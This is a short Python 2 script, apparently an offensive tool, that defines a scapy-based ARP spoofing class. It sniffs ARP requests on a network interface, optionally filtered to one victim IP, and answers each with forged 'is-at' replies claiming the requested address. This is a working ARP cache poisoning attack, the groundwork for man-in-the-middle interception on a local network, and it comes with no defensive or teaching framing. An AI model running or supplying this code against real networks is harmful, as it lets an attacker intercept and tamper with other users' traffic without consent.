#!/usr/bin/python
import sys
from scapy.all import sniff, sendp, ARP, Ether
#router_ip='192.168.0.1'
from time import *
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
my_ip=s.getsockname()[0]
s.close()
class ARP_spoofing():
    def __init__(self, *args):
        self.dev=''
        self.stop=False
        self.victim=''
        self.spoofing_messages_list=[]
        self.finished_arp_spoof=False
        self.arp_spoof_msg=''

    def arp_poison_callback(self, packet):
        if self.stop ==  True:
            print "arp sooofing stoped"
            exit(0);
        router_ip=''
        # Got ARP request?
        answer = Ether(dst=packet[ARP].hwsrc) / ARP()

        if self.victim !='':
            if  str(packet[ARP].psrc) !=str(self.victim) and str(packet[ARP].pdst) !=  str(self.victim):
                return 0

        print packet[ARP].psrc
        print packet[ARP].pdst
        answer = Ether(dst=packet[ARP].hwsrc) / ARP()
        answer[ARP].op = "is-at"
        answer[ARP].hwdst = packet[ARP].hwsrc
        answer[ARP].psrc = packet[ARP].pdst
        answer[ARP].pdst = packet[ARP].psrc
        #router_ip=packet[ARP].pdst
        self.arp_spoof_msg="Fooling " + packet[ARP].psrc + " that " + packet[ARP].pdst + " is me"
        print self.arp_spoof_msg
        
        try:
            sendp(answer, iface=self.dev)
        except Exception, e:
            print "The following error occurred " + str(e)
        

    def start_arp_spoofing(self, *args):
        self.dev=args[1]
        self.victim=args[0]
        print "sniffing on "+ str (self.dev)
        if self.victim !='':
            sniff(prn=self.arp_poison_callback,filter="arp and host "+ self.victim,iface=self.dev,store=0)
            print "victim is "+str(self.victim)
        else:
            sniff(prn=self.arp_poison_callback,filter="arp",iface=self.dev, store=0)
            print "no victim supplied"